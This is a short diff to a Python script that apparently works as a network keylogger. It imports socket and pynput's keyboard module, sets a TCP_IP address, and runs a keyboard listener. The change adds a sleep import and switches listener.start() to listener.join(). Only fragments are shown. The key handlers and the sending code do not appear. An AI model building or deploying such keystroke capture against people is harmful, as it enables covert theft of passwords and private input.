@@ -2,7 +2,7 @@
 
 import socket
 from pynput import keyboard
-
+from time import sleep
 
 
 TCP_IP = '192.168.1.10'
@@ -43,4 +43,4 @@ def on_release(key):
 with keyboard.Listener(
         on_press=on_press,
         on_release=on_release) as listener:
-    listener.start()
+        listener.join()
